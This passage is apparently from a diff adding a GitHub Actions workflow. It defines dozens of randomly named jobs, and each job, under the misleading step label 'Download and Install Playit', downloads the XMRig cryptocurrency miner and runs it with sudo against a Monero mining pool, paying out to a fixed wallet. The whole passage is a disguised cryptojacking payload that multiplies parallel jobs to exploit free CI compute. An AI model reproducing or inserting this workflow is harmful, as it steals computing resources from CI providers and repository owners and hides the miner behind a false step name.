+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  asshlzvrlhjvrafyc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  xkvlpnkgknwcztsm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  kencjjponiwzmwpbj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  gbpfsnrrcmkpwnii:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  iwssmzrpawtotcmgp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  haemugwlsbaayjxe:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  gdcyntmxyztaikuwi:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  yieddvgeeyfnaukl:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  likvnvdgvofufdhcm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  bmezzaenqremgyvr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wphoqlihvkphslpco:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  nwclgzedjzaygrft:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ukwfcsuhtqshhyhkc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  xjioibcwfpntcpda:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  aygghvbshfxpnhkgw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vkojgqunxmhoyzcw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  rsiqqxgweqosvujgx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  objscrsqvlpircze:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  oxtlgsijptyslqzum:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  myeflttyyteylmss:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  mpeweiwwvfqqlwcsr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  zubnnchklgymwpuw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  uzwxqhboftutwrdwy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  gcbemlszjmepgoqc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xusbsjyivwqvxbdke:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  kvihxvqgdyyladmp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  sppgirfivuxggdild:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  cwldjomujuhqqaqf:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  gzammzdemkegdbqjn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  xeasjhregezkxqgj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  kviwqrcgbexcxyldc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ziuhnbsklfirhtwc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  quvhkbehiuzvkpenx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  zeiwgbymdodfkmrg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xybvmiqjcffcwujuu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  wsoaqwyvygzbwoem:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  fzspdzhzxfgbpqkhx:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  rxznlphwhemjecag:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  zeosjqarbqfjrunbb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vpoxodkoyolpoqob:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  eeybakvmjdgshizdi:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  kqxonblhxntjiepf:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  jawvjnvqcgdfiwjyg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  fnabpoqaasrduaby:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xydekmyuyjpcmhszc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  tckrkmwbjtwvffhq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
